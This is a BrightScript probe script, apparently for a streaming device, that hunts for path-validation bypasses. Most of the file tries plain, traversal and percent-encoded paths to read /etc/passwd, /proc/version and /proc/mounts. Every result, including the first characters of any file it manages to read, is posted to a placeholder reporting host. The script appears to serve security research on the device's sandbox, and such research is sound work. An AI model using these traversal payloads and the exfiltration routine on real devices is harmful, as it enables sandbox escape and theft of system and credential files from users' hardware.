' ENC2 — path-validation bypass hunt, WITH CONTROLS.
'
' v1 was uninterpretable: every read returned length 0, and without a known-good
' file first there is no way to tell "blocked" from "the API returned empty".
'
' Order matters: two controls prove the API works in this context, then the
' candidate bypasses. Also tests bare absolute paths, which v1 never did.

sub main()
    print "[E2] ===== start ====="

    ' --- controls: must be non-zero, or the whole run means nothing
    Control("CTRL_ca", "common:/certs/ca-bundle.crt")
    Control("CTRL_manifest", "pkg:/manifest")

    ' --- bare absolute paths, straight through the file API
    Probe("abs_procversion", "/proc/version")
    Probe("abs_procmounts", "/proc/mounts")
    Probe("abs_passwd", "/etc/passwd")

    ' --- traversal candidates
    Probe("trav_common", "common:/../../proc/version")
    Probe("trav_common_deep", "common:/../../../../proc/version")
    Probe("trav_tmp", "tmp:/../../proc/version")
    Probe("trav_cache", "cachefs:/../../proc/version")
    Probe("trav_pkg", "pkg:/../../../proc/version")

    ' --- percent-encoded traversal
    Probe("enc_lower", "common:/%2e%2e/%2e%2e/proc/version")
    Probe("enc_upper", "common:/%2E%2E/%2E%2E/proc/version")
    Probe("enc_sep", "common:/..%2f..%2fproc/version")
    Probe("enc_double", "common:/%252e%252e/%252e%252e/proc/version")

    ' --- does roFileSystem agree with ReadAsciiFile?
    FileSysCheck("common:/certs/ca-bundle.crt")
    FileSysCheck("/proc/version")

    print "[E2] ===== end ====="
    Idle()
end sub

sub Control(label as string, target as string)
    got = TryRead(target)
    size = -1
    first = ""
    if got <> invalid then
        size = got.Len()
        if size > 0 then first = Left(got, 60)
    end if
    print "[E2] "; label; " len="; size
    Report(label, target, size, first)
end sub

sub Probe(label as string, target as string)
    Control(label, target)
end sub

sub FileSysCheck(target as string)
    answer = "?"
    try
        fs = CreateObject("roFileSystem")
        if fs.Exists(target) then answer = "exists" else answer = "absent"
    catch e
        answer = "threw"
    end try
    print "[E2] fs "; target; " = "; answer
    Report("FS_" + target, target, -2, answer)
end sub

function TryRead(target as string) as dynamic
    try
        return ReadAsciiFile(target)
    catch e
        return invalid
    end try
end function

sub Report(label as string, target as string, size as dynamic, first as string)
    msg = label + "\t" + target + "\tlen=" + LongToStr(size) + "\t" + first
    try
        x = CreateObject("roUrlTransfer")
        x.SetUrl("http://HOST_IP_EN0:8899/report")
        x.SetPort(CreateObject("roMessagePort"))
        x.PostFromString(msg)
    catch e
        print "[E2] post threw"
    end try
end sub

function LongToStr(v as dynamic) as string
    if type(v) = "Integer" or type(v) = "LongInteger" then
        return v.ToStr()
    end if
    return "?"
end function

sub Idle()
    port = CreateObject("roMessagePort")
    while true
        wait(2000, port)
    end while
end sub
